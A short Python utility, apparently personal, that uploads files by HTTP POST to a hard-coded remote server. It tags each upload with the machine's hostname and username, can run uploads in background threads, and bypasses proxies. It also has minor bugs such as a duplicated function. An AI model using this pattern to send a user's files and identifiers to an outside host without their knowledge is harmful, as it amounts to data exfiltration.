import requests
import os
import time
import uuid
from threading import Thread

y_url = "http://pscly.cn:31002/"
# y_url = 'http://127.0.0.1:31001/'
proxies = {"http": None, "https": None}


def get_system_info(hash=0):
    hostname = os.environ.get("COMPUTERNAME")
    username = os.environ.get("USERNAME")
    data = str(hostname) + str(username)
    if hash:
        return str(uuid.uuid3(uuid.NAMESPACE_DNS, data).hex)
    else:
        return data


def send_data():
    pass


def send_file(file_path):
    url = f"{y_url}/files2/up"
    x = requests.post(url, files={"file": open(file_path, "rb")}, proxies=proxies)


def send_file_xc(file_path):
    Thread(target=send_file, args=(file_path,)).start()


def send_file_2(file_path):
    url = f"{y_url}/files2/up"
    filesname = (
        get_system_info()
        + time.strftime("%Y-%m-%d_%H-%M")
        + os.path.basename(file_path)
    )
    x = requests.post(
        url,
        data={"file_name": filesname},
        files={"file": open(file_path, "rb")},
        proxies=proxies,
    )


def send_file_xc(file_path):
    Thread(target=send_file, args=(file_path,)).start()


if __name__ == "__main__":
    # send_file_2(r'D:\cly\xm\tk2-2\msedgedriver.exe')
    x = requests.get("http://pscly.cn:31002/md", proxies=proxies)
    print(x.text)
